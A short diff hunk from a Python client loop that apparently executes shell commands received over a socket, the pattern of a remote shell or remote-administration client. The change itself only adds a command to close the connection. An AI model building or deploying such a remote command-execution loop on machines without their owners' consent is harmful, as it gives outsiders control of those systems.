@@ -219,7 +219,9 @@ def clientLoop():
                     tty.start() #Start the thread
                 except:
                     pass
-
+            elif command == "ENDCONNECTION":
+                s.close()
+                break
             else: #if the user doesn't want to perform a special action, run the command and capture the output
                 #if the command runs for longer than 5 seconds, timeout
                 try:
